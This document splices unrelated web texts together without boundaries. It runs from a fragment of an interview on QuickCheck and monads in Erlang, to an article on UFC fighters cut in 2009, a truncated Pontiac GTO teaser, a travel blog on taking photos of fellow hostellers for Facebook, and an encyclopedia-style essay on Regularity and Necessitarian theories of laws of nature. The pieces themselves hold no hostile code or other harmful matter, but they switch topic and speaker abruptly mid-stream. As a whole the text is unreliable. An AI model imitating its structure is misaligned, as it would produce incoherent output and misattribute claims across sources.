Yes , but I 'm pretty focused at the moment , I 'm only part time at the university , part time at the company and we have this EU research project that is closely related to the Erlang work I 'm doing at the company , so for natural reasons , just at the moment , that 's where virtually all my time is being spent .
16 .
More than side effect free , are there other concepts from functional programming that you are applying in Erlang , like maybe monads or other abstractions that we see a lot in Haskell and other functional programming languages ?
What I 'm doing in Erlang is providing a domain specific language for testing and just like the domain specific languages that are provided in Haskell , higher order programming is a very important part of that , lazy evaluation is an important part because we are searching a space for minimal test cases and search processes are very nicely expressed in lazy evaluation and actually using a monad as well .
I 'm probably one of the few Erlang programmers who is using a monad .
I think that many people , when they think about monads , they think that they are a way of doing IO without losing referential transparency .
Then , it 's natural to think " Well , you can already do IO in Erlang , and without any need for monads , so why use one ? "
In fact , monads are useful both for capturing IO and as a program structuring concept .
That I think is perhaps the more important use of monads and that 's what I 'm doing inside the Erlang code I 'm writing .
QuickCheck is based on a monad and it's not the same kind of monad that you do IO with .
If you were , I would n't need it , but it enables me to structure the code of Quick Check very nicely .
18 . Do you miss them ?
I 'm looking at a specific kind of application and in that application , then I do n't think the lack of type class is really a big deal .
One of the nice things about the Haskell version of QuickCheck is that we use type classes in order to generate test data of the right type and the programmer does n't have to say anything , whereas , in the Erlang version , then you have to say " Generate me an integer " or " Generate me a list of integers " or " Generate me a protocol message " or whatever .
You have to specify the generators , instead of getting them " for free " .
At first sight , that looks like a disadvantage , but in reality , when you move beyond very simple properties , then you almost always need to specify generators .
Generation is more complex than just saying " Give me an int " .
Maybe you want to generate a list and then generate one of the elements from the list for example , so you have dependencies between the things that you are generating .
As soon as you move beyond very simple properties , you have to write the generators in Haskell also .
Then , the fact that you have to write them in the Erlang version it 's not really a disadvantage .
You have to do the same thing basically .
In 2009 the UFC have been cutting fighters quicker than ever before .
Dozens of names have fallen from the roster over the course of the year , meaning that those under contract with the promotion are under more pressure than ever to win each and every time they enter the octagon .
In this two part article we will pick out 20 fighters from those released in 2009 and see what they have achieved since being cut from the world ’s leading MMA promotion .
—
Rich Clementi
A veteran of the UFC who first fought at UFC 41 ( losing to Yves Edwards ) , Clementi found his way back into the fold via TUF season 4 .
He last fought in the UFC at UFN 17 , losing to Gleison Tibau by guillotine choke , bowing out with a 5 - 5 record for the promotion .
Since being cut Clementi has kept busy .
He has fought four times for smaller promotions , winning three and losing once .
The loss , to Kyle Jensen , was unfortunate since it was self inflicted when he attempted a takedown and landed awkwardly , breaking his clavicle .
A return to the UFC ca n’t be completely ruled out for the 33 year old .
At his peak Clementi went on a four fight winning streak in the promotion , beating notable fighters from the current roster like Anthony Johnson , Terry Etim and Melvin Guillard , but it ’s unlikely he would be anything other than a bit - part player now .

Jeremy Horn
After losing to Rousimar Palhares at the start of the year , his third defeat in a row , veteran performer Jeremy Horn once again found himself out of the UFC .
It was nothing new for the 34 year old who has been in and out of the promotion since as far back as UFC 17 in 1998 .
He left with a 6 - 7 overall record in the UFC , and has since went three fights unbeaten , all by submission .
The opposition has been questionable though , with the most notable name among them being Jason Guida , who has struggled to find the success of his younger brother Clay .
It would seem unlikely that a return to the UFC is on the cards for Horn , but considering his history with the company it ’s not an option you ’d want to rule out entirely .

Matt Horwich
Former IFL middleweight champion Matt Horwich struggled to make an impact in the UFC after signing for the company in 2008 .
He suffered losses to both Dan Miller and Ricardo Almeida in the middleweight division , and as a result found himself released from his contract in April .
Two months later Horwich competed for Bellator , losing a decision to Bryan Baker ( 11 - 1 ) .
In October he got back to winning ways , avenging a previous defeat against another former UFC fighter Jason Lambert ( who is now on a five fight losing streak ) .
The much needed victory for Horwich puts his career record at 23 - 13 - 1 .
At 31 there ’s still time left in this veteran fighter ’s career , but there ’s no indication that a return to the UFC is on the horizon .
—
Jason Macdonald
Jason Macdonald became a familiar fixture in the UFC between 2006 - 2009 , racking up 10 fights in the middleweight division .
Along the way he earned three ‘ Submission Of The Night ’ awards , and one ‘ Knockout Of The Night ’ , but after succumbing to back - to - back defeats against Wilson Gouveia and Nate Quarry , leaving him 5 - 5 overall in the promotion , he found himself cut from the roster in April .
After a six month layoff Macdonald has returned to the Canadian promotion MFC where he had competed numerous times in his early career .
In his first fight he faced another former UFC fighter Travis Lutter , losing by decision , but has since bounced back with a victory in December against TUF 3 competitor Solomon Hutcherson ( 11 - 6 ) .
When Macdonald left the UFC he stated that the promotions matchmaker Joe Silva had assured him that a few wins for smaller organizations could see him back in the fold .
There ’s enough goodwill from fans for that to still be a possibility , but his recent record has become very patchy , and he needs to find consistency in 2010 .

Thales Leites
Perhaps one of the most notable fighters to be cut from the roster in 2009 , Leites went from compiling a five fight win streak and competing for the middleweight championship against Anderson Silva in April , to being cut just one fight later after a loss to Alessio Sakara .
There ’s no doubt the fighter was being punished for the title fight against Silva in which he appeared reluctant to engage and weakly attempted to pull guard , resulting in five of the least action packed rounds your likely to have seen this year .
Failing to learn his lesson the Sakara fight at UFC 101 was also heavily criticized for it ’s lack of action , and that was the final straw for the UFC .
Since then Leites has fought once more , in December against Dean Lister in the MFC .
Though he claimed victory by unanimous decision it was another lackluster display that is unlikely to have impressed the UFC bigwigs .
At 29 years age the submission specialist needs not just to win , but to win impressively in 2010 if he harbors an ambition to return to the big stage .

Tamdan McCrory
One of the more surprising cuts this year was Tamdan McCrory , who had become somewhat of a cult figure in the promotion thanks to his scrappy fighting style and unlikely looks .
He claimed a record of 3 - 3 in the UFC , but after going 1 - 2 in his last three fights he was dropped in August .
The ‘ Barncat ’ , currently 11 - 3 , has n’t fought since being dropped .
This appears to have been intentional , with reports at the time suggesting he was taking time out for the rest of 2009 to continue teaching at the CNY MMA school , while plotting a potential move up to middleweight .
At just 23 years of age there ’s plenty of time for McCrory , and if he gets back into the cage in 2010 and gets a couple of wins under his belt he could very well find himself back in the UFC .
—
Akihiro Gono
After becoming a star in his native Japan , Gono arrived in the UFC in late 2007 , claiming a victory over Tamdan McCrory and picking up ‘ Submission Of The Night ’ .
He found the going tougher in his next two fights though , ending up on the wrong end of decisions against both Dan Hardy and Jon Fitch .
After the latter defeat in January he was released from the promotion .
As you would expect there was plenty of demand for the fighter back in Japan and he has fought twice for Sengoku since , losing to the 19 - 2 Dan Hornbuckle ( who was recently acquired by Bellator ) , and then claiming victory over Yoon Young Kim in November .
He is now scheduled to face another Japanese star , Sakurai at the year ending Dynamite !!
2009 event , and it may be that the fighter will remain in Japan for the forseeable future .

Jason Day
Canadian Jason ‘ Dooms ’
Day marked his arrival in the UFC with a TKO win in the very first round over Alan Belcher at UFC 83 .
Unfortunately his fortunes were quickly reversed in his next fight when Michael Bisping defeated him by the same method , and then Kendall Grove KO ’d him in the first round at UFC 96 in March .
After being released from the UFC , Day quickly found his next fight back in Canada at RITC 35 in June , where he managed to pull off an Eddie Bravo ( his BJJ coach ) inspired ‘ twister ’ submission against Trevor Stewardson .
According to his twitter account Day is set to fight again in the near future , against an as yet unnamed opponent .
—
Vinny Magalhaes
A highly decorated Brazilian Jiu Jitsu practitioner , Magalhaes is unquestionably deadly on the ground .
Unfortunately after making it to the TUF 8 finale against Ryan Bader it became clear he was not as comfortable on his feet , and he suffered a TKO loss in the first round .
A tentative display against Eliot Marshall in his next fight that resulted in a decision loss led to the fighter being released in April .
At the time his MMA record stood at 2 - 4 ( 1 NC ) , but he has since improved upon that with two wins against Chris Davis ( 6 - 2 ) and Mike Nickels ( 8 - 3 ) in the last three months , taking him to 4 - 4 ( 1 NC ) .
Meanwhile he has also continued to impress with his grappling skills , claiming the Bronze medal at the prestigious ADCC 2009 event , claiming a spectacular flying armbar submission over former ADCC winner Marcio “ Pe De Pano ” Cruz along the way .
In hindsight perhaps the UFC came along to early for the 25 year old .
If he can become a more well rounded fighter , and continue to claim victories in MMA competition , then there ’s a good chance he can make a return to the UFC ’s light heavyweight division in the future .
—
Ryo Chonan
Chonan entered the UFC with one fight on his record in particular standing out – an unexpected and spectacular win over Anderson Silva in Pride via flying scissor heel hook submission .
His overall record was somewhat chequered though , and he found the going tough in the UFC .
He went 1 - 3 in the promotion and was given his marching orders in April after a controversial split decision loss to TJ Grant .
He returned to Japan afterwards and fought again for DEEP where he had once been the middleweight champion .
He claimed a win there in August , taking his record to 16 - 10 .
He has not fought since , and it ’s unlikely the 33 year old will find his way back to the UFC .

Pontiac Gto
The team know a rust - free GTO would be a great car to kick off the USA workshop .
But these cars are rare , and Mike has to travel all the way ...
Even the most experienced travel photographers make a simple mistake .
It has nothing to do with the quality of the photos they take , is independent of the quality of their camera , and has little to do with composition .
I ’m not talking about how to take stunning shots of the local people , natural beauty or architectural flare you encounter .
I ’m talking about the photos that will never make it into the photo gallery you share with friends and family at the end of your trip .
I ’m talking about photos of near strangers which offer an entirely different opportunity .
Building A Global Community
I ’ve got the travel bug .
There ’s no denying it .
If I do n’t manage a trip every 8 months or so I get antsy .
Very antsy .
One of my favorite things about traveling is the people I ’ve met over the years .
Just today I chatted with a friend from Sweden on Facebook , reflected on time spent in Spain when I saw an update from another friend , and wished yet another friend I made while on the road Happy Birthday .
That ’s a pretty incredible opportunity for a guy sitting behind a computer in arid Scottsdale , Arizona .
What I ’ve come to realize is that we now have an incredible tool to not only keep in contact , but to help each other record part of our experience .
The catch is , we have to remember to snap a few extra photos along the way .
Those photos help cement our friendship , build comradery and offer a wonderful way to remember amazing moments that bring memories back to life .
The Power of Facebook
Facebook has been an amazing tool for travelers .
It ’s an easy way to connect , share media , and keep in contact .
It ’s also a huge tool among hostelers and backpackers .
Even though the majority of its market share is tied to English speaking countries , the site has become the default service social network for travelers .
Spend more than a week hosteling and you ’re almost guaranteed to end up with a Facebook profile .
Love it or hate it , there ’s no question that Facebook offers a much better tool for keeping in contact than e-mail .
It also provides a fantastic tool for sharing photos .
No small task when it takes weeks , if not months for travelers to get to a computer where they can upload , sort , and tag their shots .
The Social Photo
What is the social photo ?
It ’s an opportunity for travelers – near strangers – to help each other document their trip .
As you meet people on your tour , in hostels or at random start snapping photos of them as you would a travel companion or life long friend .
Not just photos of them posing as we ’re all inclined to do , but photos of them experiencing the adventure .
Supplement these shots with social shots during fun events and outings and do your best to make sure they ’re flattering .
Let me be clear .
I ’m not encouraging you to be that weird guy with 50 photos of that attractive girl from the hostels cleavage .
I ’m also not encouraging you to snap 50 photos of people you do n’t know .
I am encouraging you to snap a few shots here and a few shots there that not only help document your trip – but can really be a wonderful discovery that helps your new found friends document their own .
These shots are of course , worthless if you do n’t share them – so make a concerted effort to not only connect on Facebook with fellow travelers , but to also upload your photos and tag them !
It ’s a delightful surprise to have fun shots from past trips appear on Facebook months after your original trip has wound down .
So get out there and make sure to fire off a few extra photos next time !
As always , I value your comments !
Have a favorite photo that someone took of you on the road ?

Laws of Nature
Laws of Nature are to be distinguished both from Scientific Laws and from Natural Laws .
Neither Natural Laws , as invoked in legal or ethical theories , nor Scientific Laws , which some researchers consider to be scientists ’ attempts to state or approximate the Laws of Nature , will be discussed in this article .
Instead , it explores issues in contemporary metaphysics .
Within metaphysics , there are two competing theories of Laws of Nature .
On one account , the Regularity Theory , Laws of Nature are statements of the uniformities or regularities in the world ; they are mere descriptions of the way the world is .
On the other account , the Necessitarian Theory , Laws of Nature are the “ principles ” which govern the natural phenomena of the world .
That is , the natural world “ obeys ” the Laws of Nature .
This seemingly innocuous difference marks one of the most profound gulfs within contemporary philosophy , and has quite unexpected , and wide - ranging , implications .
Some of these implications involve accidental truths , false existentials , the correspondence theory of truth , and the concept of free will .
Perhaps the most important implication of each theory is whether the universe is a cosmic coincidence or driven by specific , eternal laws of nature .
Each side takes a different stance on each of these issues , and to adopt either theory is to give up one or more strong beliefs about the nature of the world .
Table of Contents
1. Laws of Nature vs. Laws of Science
In 1959 , at the annual meeting of the American Association for the Advancement of Sciences , Michael Scriven read a paper that implicitly distinguished between Laws of Nature and Laws of Science .
Laws of Science ( what he at that time called “ physical laws ” ) – with few exceptions – are inaccurate , are at best approximations of the truth , and are of limited range of application .
The theme has since been picked up and advanced by Nancy Cartwright .
If scientific laws are inaccurate , then – presumably – there must be some other laws ( statements , propositions , principles ) , doubtless more complex , which are accurate , which are not approximation to the truth but are literally true .
When , for example , generations of philosophers have agonized over whether physical determinism precludes the existence of free will ( for example , Honderich ) , they have been concerned with these latter laws , the laws of nature itself .
It is the explication of these latter laws , the Laws of Nature , that is the topic of this article .
We will not here be examining the “ approximate truths ” of science .
Thus , to cite just one example , the controversy over whether scientific laws are ( merely ) instruments lies outside the topic of this article .
2. The Two Principal Views
Theories as to the features of Laws of Nature fall into two , quite distinct , schools : the Humeans ( or Neo- Humeans ) on the one side , the Necessitarians on the other .
a. Regularity
Recent scholarship ( for example , that of J. Wright and of Beauchamp and Rosenberg ) makes a convincing case that the received view as to what David Hume offered as an explication of the concept of law of nature was quite mistaken , indeed the very opposite of what Hume was arguing .
What , historically , until late in the Twentieth Century , was called the “ Humean ” account of Laws of Nature was a misnomer .
Hume himself was no “ Humean ” as regards laws of nature .
Hume , it turns out , was a Necessitarian – i.e. believed that laws of nature are in some sense “ necessary ” ( although of course not logically necessary ) .
His legendary skepticism was epistemological .
He was concerned , indeed even baffled , how our knowledge of physical necessity could arise .
What , in experience , accounted for the origin of the idea ?
What , in experience , provided evidence of the existence of the property ?
He could find nothing that played such a role .
Yet , in spite of his epistemological skepticism , he persisted in his belief that laws of nature are ( physical ) necessities .
So as not to perpetuate the historical error as to what “ Humean ” properly connotes , I will abandon that term altogether and will adopt the relatively unproblematical term “ Regularity ” in its stead .
At the very least , the Regularists ’
Theory of Laws of Nature denies that Laws of Nature are ‘ physically necessary ’ .
There is no physical necessity , either in laws or in nature itself .
There is no intermediate state between logical necessity on the one hand and sheer contingency on the other .
b. Necessitarianism
Necessitarians , in contrast , argue that there is physical ( or as they sometimes call it “ nomic ” or “ nomological ” ) necessity .
They offer two different accounts .
According to some Necessitarians , physical necessity is a property of the Laws of Nature ( along with truth , universality , etc. ) ; according to other Necessitarians , physical necessity inheres in the very woof and warp ( the stuff and structure ) of the universe .
Thus , for example , on the first of these two Necessitarian theories , electrons will bear the electrical charge - 1.6 x 10 –19 Coulombs because there is a Law of Nature to that effect , and the universe conforms to , or is ‘ governed ’ by , this physically necessary ( i.e. nomological ) principle ( along with a number of others , of course ) .
On the second of the two Necessitarian theories , the “ necessity ” of an electron ’s bearing this particular electrical charge “ resides ” in the electron itself .
It is of the very ‘ nature ’ of an electron , by necessity , to have this particular electrical charge .
On this latter account , the statement “ All electrons bear a charge of - 1.6 x 10 –19 Coulombs ” is a Law of Nature because it correctly ( veridically ) describes a physical necessity in the world . [ 1 ]
3. Shared Elements in the Competing Theories
Regularists and Necessitarians agree as to five conditions necessary for a statement ’s being a Law of Nature .
Laws of Nature 1 . are factual truths , not logical ones ;
“ The boiling point of sulfur is 444.6° Celsius ” expresses a factual truth .
“ Every number has a double ” expresses a logical truth .
2 . are true for every time and every place in the universe ;
There are no laws of nature that hold just for the planet earth ( or the Andromeda Galaxy , for that matter ) , nor are there any that hold just for the Eighteenth Century or just for the Mesozoic Era.
3 . contain no proper names ;
Laws of nature may contain general concepts , such as “ mass ” , “ color ” , “ aptitude ” , “ capital ” , “ diabetes ” , “ return on investments ” , etc. ; but may not contain such terms as “ the Fraser River ” , “ the planet Earth ” , “ $ 59.22 ” , “ June 18 , 1935 ” , “ IBM ” , etc. 4 . are universal or statistical claims ; and “ ( All pure ) copper conducts electricity ” expresses a law of nature .
But “ Stars exist ” ( although true ) does not express a law of nature : it is neither a universal nor a statistical claim .
5 . are conditional claims , not categorical ones .
Categorical claims which are equivalent to conditional claims ( e.g .
“ There are no perpetual motion machines of the first kind ” which is equivalent to “ If anything is a perpetual motion machine then it is not of the first kind ” ) are candidates for lawfulness . [
2 ] Categorical claims ( e.g. , again , “ There are stars ” ) which are not equivalent to conditionals are not candidates for lawfulness .
Note : Laws of physics which are expressed mathematically are taken to be elliptical for conditional truths .
For example , the law “ m v = m o / ( 1 – v2 / c2 ) ½ ” is to be read as equivalent to “ for any massy object , if its velocity is v , then its mass [ m v ] is equal to its rest mass [ m o ] divided by … ”
Are these five conditions jointly sufficient for a proposition ’s being a Law of Nature ?
Regularists say “ yes ” ; Necessitarians , “ no ” .
4 . The Case for Necessitarianism
Necessitarians lay claim to a number of examples which , they say , can be explicated only by positing a sixth necessary condition for laws of nature , namely , by positing natural ( physical / nomic / nomological ) necessity .
a. Accidental Truths vs. Laws of Nature
Moas ( a large flightless bird that lived in New Zealand ) have been extinct for more than a century .
We can assume ( this example is Popper ’s [ The Logic of Scientific Discovery , Appendix * x ] ) that some one of them ( we need n’t know which one ) was the oldest Moa ever to have lived .
Suppose it died at the age of n years .
Thus the statement “ No moa lives beyond the age of n years ” is true ( where “ lives ” is being used as a tenseless verb ) .
Moreover this statement satisfies all the other necessary conditions specified above .
But , Necessitarians will argue , the statement “ No moa lives beyond the age of n years ” is not a law of nature .
It is counterintuitive to believe that such a statement could be on the same ( metaphysical ) footing as “ No perpetual motion machine of the first kind exists ” , or , citing another example , “ No object having mass is accelerated beyond the speed of light ” .
The latter statements are bona fide laws of nature ; the former a mere ‘ accidental ’ truth .
The difference lies in the ( alleged ) fact that the latter two cases ( about perpetual motion machines and about massy objects ) are physically necessary truths ; the former ( about moas ) is a mere accidental truth .
To use Popper ’s terminology , genuine laws of nature “ forbid ” certain things to happen ; accidental truths do not .
Suppose the oldest moa – we ’ll call him Ludwig – died , of an intestinal infection , at the age of ( let ’s say ) 12 years .
( I have n’t any idea what the average life span of moas was .
It ’s irrelevant for our purposes . )
Now suppose that Ludwig had a younger brother , Johann , hatched from the same clutch of eggs , one hour later than Ludwig himself .
Poor Johann – he was shot by a hunter 10 minutes before Ludwig died of his illness .
But , surely , had Johann not been shot , he would have lived to a greater age than Ludwig .
Unlike his ( very slightly ) older brother , Johann was in perfect health .
Johann was well on his way to surviving Ludwig ; it ’s just that a hunter dispatched him prematurely .
His death was a misfortune ; it was not mandated by a law of nature .
b. False Existentials
False existential statements of the sort “ Some silver burns at - 22° Celsius ” and “ There is a river of cola ” are logically equivalent to statements satisfying all of the five necessary conditions specified above .
If those conditions were to constitute a set of sufficient conditions for a statement ’s being a law of nature , then the statement “ No river is constituted of cola ” would be a law of nature . [ 3 ]
The oddity goes even more deeply .
Given that what it is to be physically impossible is to be logically inconsistent with a law of nature , then every false existential statement of the sort “ Some S is P ” or “ There is an S that is a P ” would turn out to be , not just false , but physically impossible .
But surely the statement “ There is a river of cola ” , although false , is not physically impossible .
There could be such a river .
It would merely require a colossal accident ( such as befell Boston in 1912 when a huge vat of molasses ruptured ) , or the foolish waste of a great deal of money .
If “ there is a river of cola ” is not to be regarded as physically impossible , then some one or more further conditions must be added to the set of necessary conditions for lawfulness .
Physical necessity would seem to be that needed further condition .
c. Doom vs. Failure
Suppose ( 1 ) that Earth is the only planet in the universe to have supported intelligent life ; and ( 2 ) that all life on Earth perished in 1900 when the earth was struck by a meteor 10,000 km in diameter .
Clearly , under those conditions , the Wright Brothers would never have flown their plane at Kitty Hawk .
Even though tinkerers and engineers had been trying for centuries to build a heavier - than - air motorized flying machine , everyone had failed to produce one .
But their failure was merely failure ; these projects were not doomed .
Yet , if the universe had had the slightly different history just described , the statement “ there is a heavier - than - air motorized flying machine ” would turn out to be physically impossible ; hence the project was doomed .
But , Necessitarians will argue , not all projects that fail are doomed .
Some are doomed , e.g. any attempt to accelerate a massy object beyond the speed of light , or , e.g. to build a perpetual motion machine of the first kind .
Again , just as in the case of accidental truths and lawful truths , we do not want to collapse the distinction between doom and failure .
Some projects are doomed ; others are mere failures .
The distinction warrants being preserved , and that requires positing physical necessity ( and – what is the other side of the same coin – physical impossibility ) .
5 . The Case for Regularity
With the dawning of the modern , scientific , age came the growing realization of an extensive sublime order in nature .
To be sure , humankind has always known that there is some order in the natural world – e.g. the tides rise and fall , the moon has four phases , virgins have no children , water slakes thirst , and persons grow older , not younger .
But until the rise of modern science , no one suspected the sweep of this order .
The worldview of the West has changed radically since the Renaissance .
From a world which seemed mostly chaotic , there emerged an unsuspected underlying order , an order revealed by physics , chemistry , biology , economics , sociology , psychology , neuroscience , geology , evolutionary theory , pharmacology , epidemiology , etc .
And so , alongside the older metaphysical question , “ Why is there anything , rather than nothing ? ” , there arises the newer question , “ Why is the world orderly , rather than chaotic ? ”
How can one explain the existence of this pervasive order ?
What accounts for it ?
a. Naturalizing Philosophy
Even as recently as the Eighteenth Century , we find philosophers ( e.g. Montesquieu ) explicitly attributing the order in nature to the hand of God , more specifically to His having imposed physical laws on nature in much the same way as He imposed moral laws on human beings .
There was one essential difference , however .
Human beings – it was alleged – are “ free ” to break ( act contrary to ) God ’s moral laws ; but neither human beings nor the other parts of creation are free to break God ’s physical laws .
In the Twentieth Century virtually all scientists and philosophers have abandoned theistic elements in their accounts of the Laws of Nature .
But to a very great extent – so say the Regularists – the Necessitarians have merely replaced God with Physical Necessity .
The Necessitarians ’ nontheistic view of Laws of Nature surreptitiously preserves the older prescriptivist view of Laws of Nature , namely , as dictates or edicts to the natural universe , edicts which – unlike moral laws or legislated ones – no one , and no thing , has the ability to violate .
Regularists reject this view of the world .
Regularists eschew a view of Laws of Nature which would make of them inviolable edicts imposed on the universe .
Such a view , Regularists claim , is simply a holdover from a theistic view .
It is time , they insist , to adopt a thoroughly naturalistic philosophy of science , one which is not only purged of the hand of God , but is also purged of its unempirical latter - day surrogate , namely , nomological necessity .
The difference is , perhaps , highlighted most strongly in Necessitarians saying that the Laws of Nature govern the world ; while Regularists insist that Laws of Nature do no more or less than correctly describe the world .
b. Revisiting Physical Impossibility
Doubtless the strongest objection Necessitarians level against Regularists is that the latter ’s theory obliterates the distinction between laws of nature ( for example , “ No massy object is accelerated beyond the speed of light ” ) and accidental generalizations ( e.g . “ No Moa lives more than n years ” ) .
Thus , on the Regularists ’ account , there is a virtually limitless number of Laws of Nature .
( Necessitarians , in contrast , typically operate with a view that there are only a very small number , a mere handful , of Laws of Nature , that these are the ‘ most fundamental ’ laws of physics , and that all other natural laws are logical consequences of [ i.e. ‘ reducible to ’ ] these basic laws .
I will not further pursue the issue of reductivism in this article . )
What is allegedly wrong with there being no distinction between accidental generalizations and ‘ genuine ’ Laws of Nature ?
Just this ( say the Necessitarians ) : if there is a virtually limitless number of Laws of Nature , then ( as we have seen above ) every false existential statement turns out to be physically impossible and ( again ) the distinction between ( mere ) failure and doom is obliterated .
How can Regularists reply to this seemingly devastating attack , issuing as it does from deeply entrenched philosophical intuitions ?
Regularists will defend their theory against this particular objection by arguing that the expression “ physically impossible ” has different meanings in the two theories : there is a common , or shared , meaning of this expression in both theories , but there is an additional feature in the Necessitarians ’ account that is wholly absent in the Regularists ’ .
The common ( i.e. shared ) meaning in “ physically impossible ” is “ inconsistent with a Law of Nature ” .
That is , anything that is inconsistent with a Law of Nature is “ physically impossible ” .
( On a prescriptivist account of Laws of Nature , one would say Laws of Nature “ rule out ” certain events and states - of - affairs . )
On both accounts – Necessitarianism and Regularity – what is physically impossible never , ever , occurs – not in the past , not at present , not in the future , not here , and not anywhere else .
But on the Necessitarians ’ account , there is something more to a physically impossible event ’s nonoccurrence and something more to a physically impossible state - of - affair ’s nonexistence .
What is physically impossible is not merely nonoccurrent or nonexistent .
These events and states - of - affairs simply could not occur or exist .
There is , then , in the Necessitarians ’ account , a modal element that is entirely lacking in the Regularists ’ theory .
When Necessitarians say of a claim – e.g. that someone has built a perpetual motion machine of the first kind – that it is physically impossible , they intend to be understood as claiming that not only is the situation described timelessly and universally false , it is so because it is nomically impossible .
In contrast , when Regularists say that some situation is physically impossible – e.g. that there is a river of cola – they are claiming no more and no less than that there is no such river , past , present , future , here , or elsewhere .
There is no nomic dimension to their claim .
They are not making the modal claim that there could not be such a river ; they are making simply the factual ( nonmodal ) claim that there timelessly is no such river .
( Further reading : ‘ The ’ Modal Fallacy . )
According to Regularists , the concept of physical impossibility is nothing but a special case of the concept of timeless falsity .
It is only when one imports from other theories ( Necessitarianism , Prescriptivism , etc. ) a different , modal , meaning of the expression , that paradox seems to ensue .
Understand the ambiguity of the expression , and especially its nonmodal character in the Regularity theory , and the objection that the Necessitarians level is seen to miss its mark .
( There is an allied residual problem with the foundations of Necessitarianism .
Some recent authors [ e.g. Armstrong and Carroll ] have written books attempting to explicate the concept of nomicity .
But they confess to being unable to explicate the concept , and they ultimately resort to treating it as an unanalyzable base on which to erect a theory of physical lawfulness . )
c. Regularity and Explanation
Another philosophical intuition that has prompted the belief in Necessitarianism has been the belief that to explain why one event occurred rather than another , one must argue that the occurring event “ had to happen ” given the laws of nature and antecedent conditions .
In a nutshell , the belief is that laws of nature can be used to explain the occurrence of events , accidental generalizations – ‘ mere truths devoid of nomic force ’ – can not be so utilized .
The heyday of the dispute over this issue was the 1940s and 50s .
It sputtered out , in more or less an intellectual standoff , by the late 60s .
Again , philosophical intuitions and differences run very deep .
Regularists will argue that we can explain events very well indeed , thank you , in terms of vaguely circumscribed generalities ; we do not usually invoke true generalities , let alone true generalities that are assumed to be nomically necessary .
In short , we can , and indeed do several times each day , explain events without supposing that the principles we cite are in any sense necessary .
Regularists will point to the fact that human beings had , for thousands of years , been successfully explaining some events in their environment ( e.g. that the casting cracked because it had been cooled down too quickly ) without even having the concept of nomicity , much less being able to cite any nomologically necessary universal generalizations .
Necessitarianism , on this view , then , is seen to dovetail with a certain – highly controversial – view of the nature of explanation itself , namely , that one can explain the occurrence of an event only when one is in a position to cite a generalization which is nomologically necessary .
Few philosophers are now prepared to persist with this view of explanation , but many still retain the belief that there are such things as nomologically necessary truths .
Regularists regard this belief as superfluous .
d. Problems with Necessitarianism I – Its Inverting the Truth - making Relation
Religious skeptics – had they lived in a society where they might have escaped torture for asking the question – might have wondered why ( / how ) the world molds itself to God ’s will .
God , on the Prescriptivist view of Laws of Nature , commanded the world to be certain ways , e.g. it was God ’s will ( a law of nature that He laid down ) that all electrons should have a charge of - 1.6 x 10 –19 Coulombs .
But how is all of this supposed to play out ?
How , exactly , is it that electrons do have this particular charge ?
It is a mighty strange , and unempirical , science that ultimately rests on an unintelligible power of a / the deity .
Twentieth - century Necessitarianism has dropped God from its picture of the world .
Physical necessity has assumed God ’s role : the universe conforms to ( the dictates of ? / the secret , hidden , force of ? / the inexplicable mystical power of ? ) physical laws .
God does not ‘ drive ’ the universe ; physical laws do .
But how ?
How could such a thing be possible ?
The very posit lies beyond ( far beyond ) the ability of science to uncover .
It is the transmuted remnant of a supernatural theory , one which science , emphatically , does not need .
There is another , less polemical , way of making the same point .
Although there are problems aplenty in Tarski ’s theory of truth ( i.e. the semantic theory of truth , also called the “ correspondence theory of truth ” ) , it is the best theory we have .
Its core concept is that statements ( or propositions ) are true if they describe the world the way it is , and they are false otherwise .
Put metaphorically , we can say that truth flows to propositions from the way the world is .
Propositions ‘ take their truth ’ from the world ; they do not impose their truth on the world .
If two days before an election , Tom says “ Sylvia will win ” , and two days after the election , Marcus says , “ Sylvia won ” , then whether these statements are true or false depends on whether or not Sylvia is elected .
If she is , both statements are true ; if she is not , then both statements are false .
But the truth or falsity of those statements does not bring about her winning ( or losing ) , or cause her to win ( or lose ) , the election .
Whether she wins or loses is up to the voters , not to certain statements .
Necessitarians – unwittingly perhaps – turn the semantic theory of truth on its head .
Instead of having propositions taking their truth from the way the world is , they argue that certain propositions – namely the laws of nature – impose truth on the world .
The Tarskian truth - making relation is between events or state - of - affairs on the one hand and properties of abstract entities ( propositions ) on the other .
As difficult as it may be to absorb such a concept , it is far more difficult to view a truth - making relationship the ‘ other way round ’ .
Necessitarianism requires that one imagine that a certain privileged class of propositions impose their truth on events and states of affairs .
Not only is this monumental oddity of Necessitarianism hardly ever noticed , no one – so far as I know – has ever tried to offer a theory as to its nature .
e. Problems with Necessitarianism II – Its Unempiricalness
Eighteenth - century empiricists ( Hume most especially ) wondered where , in experience , there was anything that prompted the concept of physical necessity .
Experience , it would seem , provides at best only data about how the world is , not how it must be , i.e. experience provides data concerning regularity , not ( physical ) necessity .
Hume ’s best answer , and it is clearly inadequate , lay in a habit of mind .
Twentieth - century empiricists are far more concerned with the justification of our concepts than with their origins .
So the question has now evolved to “ what evidence exists that warrants a belief in a physical necessity beyond the observed and posited regularities in nature ? ”
A number of Necessitarians ( see , for example , von Wright ) have tried to describe experiments whose outcomes would justify a belief in physical necessity .
But these thought - experiments are impotent .
At best – as Hume clearly had seen – any such experiment could show no more than a pervasive regularity in nature ; none could demonstrate that such a regularity flowed from an underlying necessity .
f. The Regularists ’ Trump Card – The Dissolution of the Problem of Free Will and Determinism
In the Regularity theory , the knotted problem of free will vs. determinism is solved ( or better , “ dissolved ” ) so thoroughly that it cannot coherently even be posed .
On the Regularists ’ view , there simply is no problem of free will .
We make choices – some trivial , such as to buy a newspaper ; others , rather more consequential , such as to buy a home , or to get married , or to go to university , etc. – but these choices are not forced upon us by the laws of nature .
Indeed , it is the other way round .
Laws of nature are ( a subclass of the ) true descriptions of the world .
Whatever happens in the world , there are true descriptions of those events .
It ’s true that you cannot “ violate ” a law of nature , but that ’s not because the laws of nature ‘ force ’ you to behave in some certain way .
It is rather that whatever you do , there is a true description of what you have done .
You certainly do n’t get to choose the laws that describe the charge on an electron or the properties of hydrogen and oxygen that explain their combining to form water .
But you do get to choose a great many other laws .
How do you do that ?
Simply by doing whatever you do in fact do .
For example , if you were to choose ( ! ) to raise your arm , then there would be a timelessly true universal description ( let ’s call it “ D 4729 ” ) of what you have done .
If , however , you were to choose not to raise your arm , then there would be a ( different ) timelessly true universal description ( we can call it “ D 5322 ” ) of what you did ( and D 4729 would be timelessly false ) .
Contrary to the Necessitarians ’ claim – that the laws of nature are not of our choosing – Regularists argue that a very great many laws of nature are of our choosing .
But it ’s not that you reflect on choosing the laws .
You do n’t wake up in the morning and ask yourself “ Which laws of nature will I create today ? ”
